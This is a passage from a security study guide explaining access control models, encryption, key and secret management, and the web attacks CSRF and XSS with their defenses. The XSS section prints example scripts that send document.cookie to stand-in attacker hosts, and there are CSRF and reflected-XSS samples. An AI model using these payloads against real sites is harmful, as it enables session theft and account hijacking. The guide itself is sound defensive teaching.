Receive JWT → validate JWT → extract role/permissions → authorize request
```

### RBAC in microservices

Each service may perform its own authorization checks using roles from tokens.

```text
User → API gateway → order service → payment service
```

**Common approaches:** JWT role claims · OAuth scopes · centralized policy service

### RBAC architecture

```text
              +----------------+
              |     Client     |
              +--------+-------+
                       |
                       v
              +----------------+
              |  API Gateway   |
              +--------+-------+
                       |
                       v
              +----------------+
              | Authorization  |
              |    Service     |
              +--------+-------+
                       |
             +---------+---------+
             |                   |
             v                   v
      +-------------+     +-------------+
      | Role Store  |     | User Store  |
      +-------------+     +-------------+
```

### RBAC vs ABAC

| | RBAC | ABAC |
|---|------|------|
| **Based on** | Roles and permissions | User, resource, and environment attributes |
| **Complexity** | Simpler | More flexible; more complex |
| **Best for** | Most business apps, admin panels | Dynamic rules, compliance, context-dependent access |

Production systems often combine both: RBAC for coarse access, ABAC for context-specific rules.

### Summary

```text
RBAC = User → Role → Permissions
Store in Users/Roles/Permissions tables with join tables
Use for straightforward access control; pair with JWT claims or API permission checks
```

---

## 10.8 ABAC

### What is ABAC?

**Attribute-based access control (ABAC)** makes authorization decisions using **attributes** of the user, resource, and environment — not just static roles.

Attributes may belong to:

- **User** — department, role, clearance level, location
- **Resource** — owner, classification, department, sensitivity
- **Environment** — time, IP address, device type, risk score

### Why ABAC?

| Benefit | Description |
|---------|-------------|
| Fine-grained control | Rules based on multiple conditions |
| Dynamic policies | Access changes with context without reassigning roles |
| Centralized rules | Policy engine evaluates complex logic |

### ABAC rule examples

**Department match:**

```text
User department: Finance
Document department: Finance
Rule: allow if departments match
```

**Time + role:**

```text
User role = Manager AND time = business hours → allow access
```

**Policy form:**

```text
IF user.role = Manager
AND resource.department = user.department
AND environment.time BETWEEN 09:00 AND 18:00
THEN ALLOW
ELSE DENY
```

### Policy-based authorization

Permissions defined using **policies** evaluated by a policy engine.

```text
Policy: allow if role = ADMIN
Policy: allow if user owns resource

Policy engine → ALLOW or DENY
```

**Benefits:** flexible · centralized management

### Object-level authorization

Authorization on a **specific resource instance** using ownership or resource attributes.

```text
GET /orders/123
Does user A own order 123?
  Yes → allow
  No  → deny
```

**Common in:** e-commerce · banking · document systems

### Field-level authorization

Different users see different fields — controlled by user and data attributes.

```text
Customer record: name, email, salary

Manager:  all fields
Employee: name and email only
```

**Benefits:** data privacy · fine-grained control

### Time-based authorization

Access depends on time attributes.

```text
Allow: 09:00 AM to 06:00 PM
Outside business hours → access denied
```

**Used in:** corporate systems · secure environments

### Context-aware authorization

Decisions use runtime **environment** attributes:

- User location
- Device type
- Network source
- Risk score
- Time of day

**Examples:**

- Allow only from company network
- Allow only from approved devices
- Deny if risk score is high

### ABAC in microservices

```text
User → API gateway → policy engine → microservice
                           ↑
                    attribute store
```

Authorization info travels via tokens (claims as attributes) or is looked up at decision time.

**Common approaches:** policy engines (OPA, Cedar) · OAuth scopes + attribute enrichment

### Centralized vs decentralized ABAC

| | Centralized | Decentralized |
|---|-------------|---------------|
| **Model** | Dedicated authorization service + policy store | Each service owns its policies |
| **Benefits** | Consistent rules; easier governance | Simpler architecture; lower dependency |
| **Challenges** | Extra service to run | Rule duplication; inconsistent policies |

```text
Centralized:
Application → authorization service → policy store → ALLOW or DENY
```

### ABAC architecture

```text
              +----------------+
              |     Client     |
              +--------+-------+
                       |
                       v
              +----------------+
              |  API Gateway   |
              +--------+-------+
                       |
                       v
              +----------------+
              | Authorization  |
              |    Service     |
              +--------+-------+
                       |
             +---------+---------+
             |                   |
             v                   v
      +-------------+     +-------------+
      | Policy Store|     | User Store  |
      +-------------+     +-------------+

Decision: ALLOW or DENY
```

### RBAC vs ABAC

| | RBAC | ABAC |
|---|------|------|
| **Based on** | Roles and permissions | Attributes and policies |
| **Flexibility** | Lower | Higher |
| **Complexity** | Simpler to implement | Requires policy engine |
| **Best for** | Stable role hierarchies | Dynamic, context-sensitive rules |

Many production systems combine both: **RBAC for coarse access**, **ABAC for fine-grained rules**.

### Summary

```text
ABAC = decisions from user + resource + environment attributes
Use policy engine for complex rules (department, time, location, ownership)
Combine with RBAC: roles for broad access, attributes for context-specific rules
```

---

## 10.9 Encryption at Rest

### What is encryption at rest?

**Encryption at rest** encrypts data while it is stored on persistent storage. Data is encrypted before being written to storage and decrypted when accessed by authorized users or services.

**Purpose:** protect stored data from unauthorized access if storage media is compromised.

**Examples:**

- Database records
- Files
- Object storage
- Backups
- Snapshots
- Log files

### Why encrypt data at rest?

**Without encryption:**

```text
Attacker gains access to hard disk, database backup, or storage volume
→ data can be read directly
```

**With encryption:**

```text
Attacker gains access to storage → data appears unreadable without encryption keys
```

**Benefits:**

- Data confidentiality
- Regulatory compliance
- Reduced breach impact
- Protection against physical theft

### Data states

Data generally exists in three states:

| State | Description |
|-------|-------------|
| **Data at rest** | Stored in databases, disks, backups |
| **Data in transit** | Moving across networks |
| **Data in use** | Being processed in memory |

Encryption at rest focuses only on **stored data**.

### Where encryption at rest is used

- Databases
- File systems
- Object storage
- Data warehouses
- Backups
- Archive storage
- Log storage
- Cloud storage

### High-level flow

**Write:**

```text
Application → encrypt data → store data → disk / database
```

**Read:**

```text
Disk / database → decrypt data → application
```

### Encryption process

```text
Plaintext → encryption algorithm + encryption key → ciphertext → storage
```

**Example:**

```text
Original: Customer Salary
Stored:   XJ29KSLA92M8PQR
```

### Decryption process

```text
Ciphertext → decryption algorithm + encryption key → original data
```

Only authorized systems possessing the correct key can decrypt data.

### Plaintext vs ciphertext

| | Plaintext | Ciphertext |
|---|-----------|------------|
| **Description** | Original readable data | Encrypted unreadable data |
| **Example** | John Doe | A92JKSLP1MZZ |

### Symmetric encryption

Same key used for encryption and decryption.

**Encrypt:**

```text
Plaintext → secret key → encryption → ciphertext
```

**Decrypt:**

```text
Ciphertext → same secret key → decryption → plaintext
```

### AES (Advanced Encryption Standard)

Most commonly used algorithm for encryption at rest.

**Features:** fast · secure · industry standard

**Common key sizes:** AES-128 · AES-192 · AES-256

Most enterprise systems use **AES-256**.

### Asymmetric encryption

Uses two keys:

| Key | Role |
|-----|------|
| **Public key** | Encrypt |
| **Private key** | Decrypt |

Typically not used directly for large data encryption due to performance cost. Often used to **protect encryption keys**.

### Envelope encryption (overview)

Cloud systems encrypt data with a **DEK** (data key), then encrypt the DEK with a **KEK** (master key). Full envelope flows and KMS integration are in **KMS** below.

### Database encryption

Database stores encrypted values.

**Before:**

```text
Name = John
Salary = 100000
```

**After:**

```text
Name = encrypted
Salary = encrypted
```

Stored data becomes unreadable without proper decryption keys.

### Column-level encryption

Only selected columns are encrypted.

```text
Customer: Name, Email, Salary

Encrypt: Email, Salary
Leave:   Name
```

**Benefits:** better performance · selective protection

### Row-level encryption

Entire rows encrypted before storage.

```text
Customer record → entire record encrypted as a unit
```

Used when complete record confidentiality is required.

### Table-level encryption

Entire database table encrypted.

```text
Payment table → encrypted completely
```

| Benefits | Challenges |
|----------|------------|
| Simpler management | Less flexibility |

### Transparent data encryption (TDE)

Database automatically encrypts data stored on disk. Application remains unchanged.

```text
Application → database → automatic encryption → disk
```

**Examples:** SQL Server TDE · Oracle TDE · PostgreSQL extensions

### File system encryption

Storage layer performs encryption.

**Examples:** encrypted volumes · encrypted partitions · encrypted SSD storage

Applications are usually unaware of the encryption process.

### Object storage encryption

Used in cloud object storage for documents, images, videos, and backups. Objects are encrypted before being persisted.

### Backup encryption

Backups often contain sensitive data.

```text
Backup → encrypt → store
```

Protection required because backups are frequently copied and transported.

### Key management (overview)

Encryption security depends on key lifecycle: creation, storage, rotation, revocation. **KMS** below covers master keys, envelope encryption, HSM, and cloud key services in detail.

### Performance considerations

Encryption introduces overhead.

**Operations affected:** write performance · read performance · CPU utilization

Modern hardware acceleration reduces much of this impact.

### Compliance requirements

Many regulations require protection of stored sensitive data.

**Examples:** financial records · personal information · healthcare records · payment information

Encryption at rest is often a **mandatory** security control.

### High-level architecture

```text
               +----------------+
               |  Application   |
               +--------+-------+
                        |
                        v
               +----------------+
               | Encryption     |
               | Service / SDK  |
               +--------+-------+
                        |
                        v
               +----------------+
               | Database / File|
               | Storage        |
               +--------+-------+
                        |
                        v
               +----------------+
               | Encrypted Data |
               +----------------+
                        |
                        v
               +----------------+
               | Key Management |
               | System / HSM   |
               +----------------+
```

### Summary

```text
Encryption at rest = protect stored data (DB, files, backups, object storage)
Use AES-256 symmetric encryption; envelope encryption (DEK + KEK) in cloud
TDE for transparent DB encryption; manage keys with rotation, HSM, or cloud KMS
```

---

## 10.10 Encryption in Transit

### What is encryption in transit?

**Encryption in transit** protects data while it moves between systems, applications, services, or users over a network.

**Purpose:** prevent unauthorized parties from reading or modifying data during transmission.

**Examples:**

- Browser to web server
- Mobile app to backend API
- Microservice to microservice
- Database client to database
- API gateway to services

### Why encrypt data in transit?

**Without encryption:**

```text
Client → internet → server

Anyone intercepting traffic may read:
  passwords, tokens, credit card data, personal information
```

**With encryption:**

```text
Client → encrypted traffic → server

Intercepted traffic appears unreadable
```

**Benefits:**

- Confidentiality
- Integrity
- Authentication
- Protection against eavesdropping

### Data states

Data exists **at rest** (stored), **in transit** (network), and **in use** (memory). Encryption in transit protects data **while it travels across networks**.

### Common use cases

- HTTPS websites
- REST APIs
- GraphQL APIs
- Microservices
- Database connections
- Cloud communication
- File transfers
- Email communication

### High-level flow

```text
Client → encrypt data → network → decrypt data → server
```

**Example:**

```text
Browser → encrypted request → web server
Web server → encrypted response → browser
```

### TLS (Transport Layer Security)

TLS is the standard protocol for encryption in transit.

**Used by:** HTTPS · secure APIs · secure email · database connections

**TLS provides:** confidentiality · integrity · authentication

### SSL vs TLS

| | SSL | TLS |
|---|-----|-----|
| **Status** | Older protocol | Modern replacement |
| **Today** | Legacy term | What systems actually use |

When people say "SSL certificate," they usually mean **TLS certificates**. Modern systems use TLS.

### HTTPS

HTTPS = HTTP + TLS

```text
http://example.com   → no encryption
https://example.com  → encrypted communication
```

**Benefits:** secure communication · user trust · data protection

### TLS handshake

Before secure communication begins, client and server perform a handshake.

```text
Client                    Server
   |                         |
   |-------- Client Hello -->|
   |<------- Server Hello ---|
   |<------- Certificate ----|
   |-------- Key Exchange -->|
   |<==== Secure Channel ===>|
```

**Purpose:** establish trust · negotiate cipher · exchange keys · create session key for bulk encryption

### Client Hello

Client initiates the TLS connection.

**Information sent:**

- Supported TLS versions
- Supported cipher suites
- Random value

```text
Browser → client hello → server
```

### Server Hello

Server responds with:

- Selected TLS version
- Selected cipher suite
- Server certificate
- Random value

```text
Client hello → server hello → certificate exchange
```

### Digital certificate

Certificate proves server identity.

**Contains:**

- Domain name
- Public key
- Certificate authority signature

```text
example.com → certificate → public key
```

### Certificate authority (CA)

Trusted organization that issues digital certificates.

**Responsibilities:**

- Verify ownership
- Issue certificates
- Establish trust

```text
Server → requests certificate → CA issues certificate → clients trust server
```

### Public key cryptography

TLS uses asymmetric encryption during initial connection setup.

| Key | Role |
|-----|------|
| **Public key** | Shared openly — encrypt |
| **Private key** | Kept secret — decrypt |

```text
Public key → encrypt → private key → decrypt
```

### Session key

After handshake, TLS creates a **session key** to encrypt actual communication.

**Why?** Symmetric encryption is much faster than asymmetric encryption.

```text
Handshake → session key created → data encrypted using session key
```

### Symmetric encryption in TLS

Used after connection establishment.

**Characteristics:** fast · efficient · suitable for large data transfer

**Common algorithm:** AES

```text
Shared session key → encrypt traffic → decrypt traffic
```

### TLS flow

```text
Client → TLS handshake → certificate verification → session key creation
     → secure channel → encrypted communication
```

### Data confidentiality

Only intended parties can read data.

```text
Password → encrypted → network → server

Interceptor cannot understand contents
```

### Data integrity

Ensures transmitted data is not altered.

```text
Original data → integrity check → transmission → verification
```

If data changes, the connection may be rejected.

### Server authentication

Client verifies server identity.

```text
Browser → verify certificate → verify domain → trust server
```

Prevents fake servers from impersonating legitimate services.

### Mutual TLS (mTLS)

| | Normal TLS | Mutual TLS (mTLS) |
|---|------------|-------------------|
| **Server** | Authenticated | Authenticated |
| **Client** | Not authenticated | Authenticated |

```text
Client certificate → server validation → mutual trust
```

### mTLS in microservices

```text
Service A → TLS connection → Service B
```

Both services verify each other's certificates.

**Benefits:** strong identity verification · secure internal communication

### Database connection encryption

```text
Application → TLS → database

Application → encrypted connection → MySQL
Application → encrypted connection → PostgreSQL
```

### API security using TLS

```text
Client → HTTPS request → API gateway → microservices
```

Tokens and credentials travel through encrypted channels.

**Commonly protects:** JWT tokens · API keys · OAuth tokens

### TLS termination

Load balancer often handles TLS.

```text
Client → HTTPS → load balancer → HTTP/TLS → application servers
```

**Benefits:** reduced server workload · centralized certificate management

### Certificate renewal

Certificates have expiration dates.

```text
Certificate → expires → renew → deploy updated certificate
```

**Benefits:** continued trust · improved security

### High-level architecture

```text
           +------------------+
           |     Client       |
           +--------+---------+
                    |
               HTTPS/TLS
                    |
                    v
           +------------------+
           | Load Balancer    |
           +--------+---------+
                    |
          +---------+---------+
          |                   |
          v                   v
   +-------------+     +-------------+
   | Service A   |     | Service B   |
   +------+------+     +------+------+
          |                   |
          |<---- mTLS ------->|
          |                   |
          v                   v
   +-------------+     +-------------+
   | Database    |     | Cache       |
   +-------------+     +-------------+
```

All communication channels are encrypted during transmission.

### Summary

```text
Encryption in transit = protect data moving over the network (TLS/HTTPS)
TLS handshake → certificate verification → session key → AES for bulk traffic
Use mTLS for service-to-service; terminate TLS at load balancer when appropriate
```

---

## 10.11 KMS

### What is KMS?

**KMS (Key Management Service)** securely creates, stores, manages, rotates, and controls cryptographic keys.

Instead of applications managing keys directly, they delegate key operations to KMS.

**Purpose:** protect encryption keys throughout their lifecycle.

### Why do we need KMS?

Encryption is only as secure as the encryption keys.

**Bad practice:**

```text
Application → store encryption key inside source code
```

**Problems:** key exposure · difficult rotation · poor auditing · security risks

**Better approach:**

```text
Application → KMS → key operations
```

**Benefits:**

- Centralized key management
- Better security
- Easier auditing
- Simplified rotation

### Responsibilities of KMS

- Key generation
- Key storage
- Key rotation
- Key access control
- Key revocation
- Key deletion
- Audit logging
- Encryption operations
- Decryption operations

### High-level architecture

```text
           +------------------+
           |   Application    |
           +--------+---------+
                    |
                    v
           +------------------+
           |       KMS        |
           +--------+---------+
                    |
         +----------+----------+
         |                     |
         v                     v
   +-------------+      +-------------+
   | Encryption  |      | Key Store   |
   | Operations  |      +-------------+
   +-------------+
```

### Key lifecycle

```text
Create key → store key → use key → rotate key → disable key → delete key
```

Every key follows a lifecycle.

### Key generation

KMS generates cryptographically secure keys using secure random generators.

```text
Example: AES-256 key — generated inside KMS
```

Applications never create keys manually.

### Key storage

Keys are stored securely.

**Characteristics:** encrypted storage · access controlled · tamper resistant · auditable

Applications typically cannot directly view key material.

### Customer master key (CMK)

Master key managed by KMS.

**Purpose:** protect other encryption keys

**Used for:** encrypting DEKs · signing operations · encryption operations

```text
CMK → encrypts DEK
```

### Data encryption key (DEK)

Key used to encrypt actual data.

```text
Customer record → DEK encrypts data
```

DEKs are usually short-lived and used only for data encryption.

### Envelope encryption

Most common KMS pattern.

```text
Data → encrypted using DEK → DEK encrypted using CMK → store data + encrypted DEK
```

**Benefits:** faster encryption · better scalability · reduced KMS load

### Envelope encryption flow

```text
Application → request DEK → KMS generates DEK → encrypt data using DEK
         → KMS encrypts DEK using CMK → store encrypted data + encrypted DEK
```

### Decryption flow

```text
Application → read encrypted data → read encrypted DEK → send DEK to KMS
         → KMS decrypts DEK → application decrypts data
```

### Key rotation

Keys should be periodically replaced.

```text
Old key → new key → future encryptions use new key
```

**Benefits:** reduced risk · compliance requirements · limits impact of key compromise

### Automatic key rotation

KMS can rotate keys automatically.

**Examples:** every 90 days · every year

New versions created without changing application logic.

### Key versioning

A key may have multiple versions.

```text
CustomerKey
  Version 1
  Version 2
  Version 3
```

Old data can still be decrypted using older key versions.

### Access control

Not every application should access every key.

```text
Order service   → order key
Payment service → payment key
```

**Benefits:** principle of least privilege · better isolation

### Key policies

Rules defining who can use keys.

```text
Allow: payment service
Deny:  inventory service
```

**Operations controlled:** encrypt · decrypt · rotate · delete

### Audit logging

Every key operation should be logged.

**Examples:**

- Who used the key?
- When was it used?
- Which service used it?

**Operations:** encrypt · decrypt · rotate · delete

### Hardware security module (HSM)

Dedicated hardware device used for secure key protection.

**Characteristics:** tamper resistant · hardware isolated · highly secure

Many KMS implementations use HSMs internally.

### Managed KMS

Cloud providers offer managed KMS.

**Responsibilities:**

- Key generation
- Storage
- Rotation
- Auditing
- Access control

Applications interact through APIs.

### Application integration

```text
Application → call KMS API → encrypt / decrypt → receive result
```

Applications should **never** hardcode encryption keys.

### Database encryption with KMS

```text
Application → generate DEK → encrypt customer data → store encrypted data

KMS → protects DEK using CMK
```

### File storage with KMS

```text
Upload file → generate DEK → encrypt file → store file
```

Encrypted DEK stored alongside file. KMS protects master keys.

### Microservices and KMS

```text
Order service    → KMS
Payment service  → KMS
Customer service → KMS
```

Each service may have separate keys and permissions.

### Benefits of KMS

- Centralized management
- Secure key storage
- Automatic rotation
- Auditability
- Compliance support
- Fine-grained access control
- Reduced operational complexity

### Common security practices

- Never hardcode keys
- Rotate keys regularly
- Use envelope encryption
- Restrict key access
- Enable audit logging
- Use HSM-backed keys
- Apply least privilege access
- Separate keys by application/domain

### High-level KMS architecture

```text
                +----------------+
                |  Application   |
                +--------+-------+
                         |
                         v
                +----------------+
                |      KMS       |
                +--------+-------+
                         |
          +--------------+--------------+
          |                             |
          v                             v
  +---------------+           +---------------+
  | Key Policies  |           | Audit Logs    |
  +---------------+           +---------------+
                         |
                         v
                +----------------+
                | Master Keys    |
                | (CMKs)         |
                +--------+-------+
                         |
                         v
                +----------------+
                | HSM / Secure   |
                | Key Storage    |
                +----------------+
```

### Summary

```text
KMS = centralized create, store, rotate, and control cryptographic keys
Use envelope encryption: DEK for data, CMK protects DEK via KMS
Never hardcode keys; enforce policies, audit logs, rotation, and least privilege
```

---

## 10.12 Secret Management

### What is secret management?

**Secret management** is the process of securely storing, accessing, rotating, and controlling sensitive credentials used by applications and services.

**Examples of secrets:**

- Database passwords
- API keys
- OAuth client secrets
- JWT signing keys
- Encryption keys
- Certificates
- SSH keys
- Third-party credentials

**Purpose:** prevent sensitive information from being exposed to unauthorized users or systems.

### Why secret management?

**Bad practice:**

```text
Application → hardcoded password

Example: db.password=admin123
```

**Problems:** source code exposure · difficult rotation · security risks · credential leakage

**Better approach:**

```text
Application → secret manager → retrieve secret securely
```

**Benefits:**

- Centralized management
- Better security
- Easier rotation
- Auditing support

### What is a secret?

A secret is any sensitive piece of information used for authentication, authorization, or encryption.

**Examples:** database password · API key · private key · OAuth client secret · JWT secret · certificate

### Secret management goals

- Secure storage
- Controlled access
- Secret rotation
- Auditability
- High availability
- Least privilege access
- Compliance support

### High-level architecture

```text
            +------------------+
            |  Application     |
            +--------+---------+
                     |
                     v
            +------------------+
            | Secret Manager   |
            +--------+---------+
                     |
                     v
            +------------------+
            | Secret Store     |
            +------------------+
```

### Secret storage

**Never store secrets in:**

- Source code
- Git repositories
- Configuration files
- Shared documents

**Store secrets in:**

- Secret manager
- Secure vault
- Encrypted secret store

### Secret retrieval flow

```text
Application startup → authenticate → request secret → secret manager
     → return secret → application uses secret
```

### Static secrets

Long-lived credentials.

**Examples:** database password · API key · SMTP password

**Characteristics:** manually managed · long expiration period · higher compromise risk

### Dynamic secrets

Secrets generated on demand.

```text
Application → request database credential → secret manager → temporary credential
```

**Characteristics:** short-lived · automatically expired · more secure

### Secret lease

Dynamic secrets usually have a lease.

```text
Database credential — valid for 1 hour
After expiration → credential becomes invalid
```

### Secret rotation

Periodic replacement of secrets.

```text
Old secret → new secret → applications updated
```

**Benefits:** reduces exposure window · improves security

### Automatic secret rotation

Secret manager rotates credentials automatically.

```text
Database password: old password → new password → application retrieves updated secret
```

### Access control

Not every application should access every secret.

```text
Order service   → order database secret
Payment service → payment database secret
```

**Benefits:** better isolation · reduced blast radius

### Least privilege principle

Applications receive only the secrets they actually need.

```text
Inventory service
  Can access:    inventory-db-password
  Cannot access: payment-db-password
```

### Secret versioning

A secret may have multiple versions.

```text
db-password
  Version 1
  Version 2
  Version 3
```

Allows safe rotation and rollback.

### Audit logging

Every secret operation should be logged.

**Examples:**

- Who accessed secret?
- When accessed?
- Which application?

**Operations:** read · create · update · delete

### Secret encryption

Secrets themselves are stored encrypted.

**Store:**

```text
Secret → encrypt → store
```

**Read:**

```text
Read secret → decrypt → return to authorized user
```

### Secret management vs KMS

| | KMS | Secret Manager |
|---|-----|----------------|
| **Manages** | Encryption keys | Credentials and secrets |
| **Examples** | Master keys, data encryption keys | Passwords, API keys, certificates, tokens |

KMS protects **keys**. Secret manager protects **credentials**.

### Secret management in microservices

```text
                +------------------+
                | Secret Manager   |
                +--------+---------+
                         |
     +-------------------+-------------------+
     |                   |                   |
     v                   v                   v
 Order Svc          Payment Svc          User Svc
```

Each service retrieves only its authorized secrets.

### Database password management

**Bad:**

```text
application.yml → db.password=admin123
```

**Good:**

```text
Application → secret manager → database password
```

Password never stored in source code.

### API key management

```text
Application → secret manager → retrieve API key → call external service
```

Keys remain centrally controlled.

### Certificate management

Secret managers often store:

- TLS certificates
- Private keys
- Client certificates

**Benefits:** centralized storage · controlled access · easier rotation

### Containerized applications

```text
Container → authenticate → fetch secret → run application
```

Secrets should not be baked into docker images, container filesystems, or source code.

### Kubernetes and secrets

```text
Application pod → request secret → secret management system → retrieve secret
```

Secrets often injected at runtime.

**Benefits:** better security · easier updates

### Common security practices

- Never hardcode secrets
- Rotate secrets regularly
- Use dynamic secrets when possible
- Enable audit logging
- Encrypt secrets at rest
- Use TLS for secret retrieval
- Apply least privilege access
- Monitor secret usage

### Common challenges

- Secret sprawl
- Manual rotation
- Access control complexity
- Credential leakage
- Audit requirements
- Multi-environment management

### High-level secret management architecture

```text
                +----------------+
                | Applications   |
                +--------+-------+
                         |
                         v
                +----------------+
                | Secret Manager |
                +--------+-------+
                         |
          +--------------+--------------+
          |                             |
          v                             v
  +---------------+           +---------------+
  | Access Policy |           | Audit Logs    |
  +---------------+           +---------------+
                         |
                         v
                +----------------+
                | Secret Store   |
                | (Encrypted)    |
                +----------------+
                         |
                         v
                +----------------+
                | KMS / HSM      |
                +----------------+
```

### Summary

```text
Secret management = secure store, access, rotate, and audit credentials
Never hardcode; use secret manager with dynamic secrets and leases when possible
Separate from KMS (keys vs credentials); least privilege, versioning, and audit logs
```

---

## 10.13 CSRF

Common web application attacks and where defenses sit:

```text
Browser request
      |
      +-- CSRF (forged state-changing request) --> CSRF token, SameSite cookie
      +-- XSS (injected script) ----------------> encoding, CSP, HttpOnly
      +-- SQLi (malicious SQL in input) --------> parameterized queries, WAF
      +-- SSRF (server fetches attacker URL) ---> URL allowlist, block private IPs
      +-- Clickjacking (hidden iframe click) ---> X-Frame-Options, CSP frame-ancestors
```

### What is CSRF?

**CSRF (Cross-Site Request Forgery)** is a web security vulnerability where an attacker tricks a logged-in user into performing unwanted actions on a trusted application.

**Key idea:** the browser automatically sends credentials, so the attacker abuses that trust.

### How CSRF happens

CSRF works because browsers automatically attach credentials like:

- Cookies
- Session IDs
- Stored authentication tokens (in some cases)

**Attack flow:**

```text
Step 1: User logs into banking website
Step 2: Browser stores session cookie
Step 3: User visits attacker website
Step 4: Attacker triggers request to bank
Step 5: Browser automatically sends cookie
Step 6: Bank executes action thinking it's valid user
```

### Example scenario

**Banking website:**

```http
POST /transfer
{
  "to": "attacker_account",
  "amount": 10000
}
```

User is already logged in. Attacker page contains:

```html
<img src="https://bank.com/transfer?amount=10000&to=attacker" />
```

Browser automatically sends session cookie.

**Result:** money transfer happens without user intent.

### Why CSRF works

Because of:

- Automatic cookie inclusion by browsers
- Trust between browser and server
- No request origin validation

Server assumes: if cookie is valid → request is valid.

### Impact of CSRF

CSRF can cause:

- Unauthorized transactions
- Profile changes
- Password changes
- Email updates
- Account deletion

Severity depends on application type.

### CSRF vs XSS

| | CSRF | XSS |
|---|------|-----|
| **Mechanism** | Tricks user browser | Injects malicious script |
| **Uses** | User identity | Runs inside victim browser |
| **Effect** | Executes unwanted actions | Steals data or session |
| **Trust abused** | Authentication trust | Application code trust |

### CSRF attack requirements

CSRF works only if:

- User is authenticated
- Cookies are automatically sent
- No CSRF protection exists
- Action changes state (POST/PUT/DELETE)

### Safe vs unsafe requests

| Safe requests | Unsafe requests |
|---------------|-----------------|
| GET (should not change data) | POST · PUT · DELETE |

CSRF mainly targets **unsafe requests**.

### CSRF protection methods

Main protection strategies:

- CSRF tokens
- SameSite cookies
- Referer/Origin validation
- Double submit cookies
- Re-authentication for sensitive actions

### CSRF token (most common method)

Each request includes a unique token.

```text
User loads page → server generates CSRF token → token stored in form or header
     → request sent with token → server validates token → allow or reject
```

**Example:**

```http
POST /transfer
X-CSRF-Token: a8d92k...
```

If token missing or invalid → request rejected.

### Why CSRF tokens work

Attacker website cannot access:

- CSRF token from server page
- Secure browser storage (same-origin policy)

So the attacker cannot forge a valid request.

### SameSite cookies

Cookie attribute: `SameSite`

| Value | Behavior |
|-------|----------|
| **Strict** | Cookie not sent in cross-site requests |
| **Lax** | Cookie sent only for safe top-level navigation |
| **None** | Cookie sent in all contexts (must use `Secure`) |

### Referer / Origin check

Server checks request source.

```http
Referer: https://trusted-site.com
```

If mismatch → reject request.

**Limitations:** can be missing · can be modified in some cases

### Double submit cookie

CSRF token stored in two places:

- Cookie
- Request parameter/header

```text
Server verifies: cookie token == request token
If mismatch → reject
```

### Re-authentication

For sensitive actions:

- Password required again
- OTP verification

**Examples:** delete account · transfer funds

Adds an extra security layer.

### CSRF in modern apps

CSRF risk depends on authentication type:

| Auth type | CSRF risk |
|-----------|-----------|
| **Session cookies** | High — CSRF possible |
| **JWT in local storage** | Lower CSRF risk (but XSS risk) |
| **JWT in cookies** | CSRF risk still exists |

### Microservices and CSRF

CSRF mainly affects:

- Browser-based clients
- Session-based authentication systems

Not typically an issue for:

- Service-to-service calls
- Backend APIs using API keys or mTLS

### High-level architecture

**Without protection:**

```text
User browser → malicious site → (forged request) → bank website
     → session cookie auto-attached → server executes request
```

**With CSRF protection:**

```text
Browser → request includes CSRF token → server validates token → reject if invalid
```

### Best practices

- Use CSRF tokens
- Enable SameSite cookies
- Validate Origin/Referer headers
- Avoid state-changing GET requests
- Use HTTPS
- Require re-auth for sensitive actions
- Short session lifetime

### Summary

```text
CSRF = attacker tricks logged-in browser into unwanted state-changing requests
Protect with CSRF tokens, SameSite cookies, Origin checks, and re-auth for sensitive actions
Main risk with session cookies; less risk with JWT in localStorage (but XSS becomes the concern)
```

---

## 10.14 XSS

### What is XSS?

**XSS (Cross-Site Scripting)** is a web security vulnerability where an attacker injects malicious scripts into a trusted website, which then executes in the user's browser.

**Key idea:** attacker injects code → browser executes it as part of the trusted website.

### Why XSS happens

XSS happens when:

- User input is not properly validated
- User input is directly rendered in HTML
- Output encoding is missing
- JavaScript execution context is unsafe

**Example:** server stores or reflects `<script>...</script>` and the browser executes it.

### Impact of XSS

XSS can lead to:

- Session cookie theft
- Account hijacking
- Credential stealing
- Unauthorized actions on behalf of user
- Defacement of websites
- Phishing attacks

Severity depends on context and data exposure.

### How XSS works

**Attack flow:**

```text
Step 1: Attacker injects malicious script
Step 2: Server stores or reflects it
Step 3: Victim loads page
Step 4: Browser executes script
Step 5: Script performs malicious actions
```

### Example of stored XSS

**Comment system** — user submits comment:

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie)
</script>
```

Server stores it in database. When other users open the page, the browser executes the script.

**Result:** cookies or session data stolen.

### Reflected XSS

Malicious script is reflected immediately from request to response.

**Example URL:**

```text
https://site.com/search?q=<script>alert(1)</script>
```

**Server response:**

```text
Search results for: <script>alert(1)</script>
```

Browser executes script instantly.

### DOM-based XSS

Occurs entirely in the browser.

```text
User input → JavaScript processes input → unsafe DOM update → script execution
```

**Example:**

```javascript
document.innerHTML = userInput
```

If `userInput` contains script → executed.

### Types of XSS

| Type | Description |
|------|-------------|
| **Stored XSS** | Stored in database; affects multiple users |
| **Reflected XSS** | Comes from request; immediate execution |
| **DOM-based XSS** | Happens in browser; no server involvement |

### How XSS executes

Browsers treat HTML + JavaScript as trusted when coming from the same origin.

If attacker injects:

```html
<script>alert('Hacked')</script>
```

Browser executes it as part of the page.

### Cookie theft via XSS

```html
<script>
fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
```

If cookies are not HttpOnly:

- Session cookie is exposed
- Attacker can hijack session

### XSS vs CSRF

| | XSS | CSRF |
|---|-----|------|
| **Mechanism** | Injects and executes script | Tricks browser into sending requests |
| **Runs** | Inside victim browser | Does not execute script in site context |
| **Effect** | Steals data or performs actions | Forged request using browser trust |

**Difference:** XSS → code execution in browser · CSRF → forged request using browser trust

### XSS prevention techniques

- Input validation
- Output encoding
- Content Security Policy (CSP)
- HttpOnly cookies
- Sanitization
- Avoid `innerHTML` usage
- Use safe templating engines

### Output encoding

Convert special characters:

```text
< → &lt;
> → &gt;
" → &quot;
```

**Example:**

```text
Input:  <script>
Output: &lt;script&gt;
```

Prevents execution.

### Input sanitization

Remove or neutralize malicious content.

**Examples:** strip `<script>` tags · allow only safe HTML tags

Used in comment systems, blogs, etc.

### Content Security Policy (CSP)

Browser security layer.

```http
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**Benefits:**

- Blocks inline scripts
- Restricts external scripts
- Reduces XSS impact

### HttpOnly cookies

Prevents JavaScript access to cookies.

```http
Set-Cookie: SESSIONID=abc123; HttpOnly
```

**Result:** `document.cookie` cannot read session — reduces cookie theft risk.

### Secure coding practices

**Avoid:**

- `innerHTML` with user input
- `eval()`
- `document.write()`

**Prefer:**

- `textContent`
- Safe frameworks (React, Angular)
- Templating engines with auto-escape

### XSS in modern apps

Modern frameworks reduce XSS risk:

| Framework | Protection |
|-----------|------------|
| **React** | Escapes values by default |
